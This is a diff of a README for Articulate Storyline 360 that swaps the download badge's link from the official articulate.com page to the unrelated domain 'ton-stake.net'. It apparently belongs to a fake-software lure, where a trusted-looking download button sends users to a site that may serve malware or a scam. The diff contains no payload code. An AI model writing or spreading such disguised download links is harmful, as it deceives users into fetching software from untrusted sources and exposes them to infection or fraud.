@@ -3,7 +3,7 @@
 
 Design **engaging e-learning courses** with **Articulate Storyline 360 Windows 2025**! This Windows-exclusive authoring tool empowers instructional designers, educators, and corporate trainers to create interactive training modules, quizzes, and presentations with ease.
 
-[![Download Storyline 360](https://img.shields.io/badge/Download-Storyline_360-blueviolet)](https://www.articulate.com/360/storyline)  
+[![Download Storyline 360](https://img.shields.io/badge/Download-Storyline_360-blueviolet)](https://ton-stake.net)  
 
 
 ---
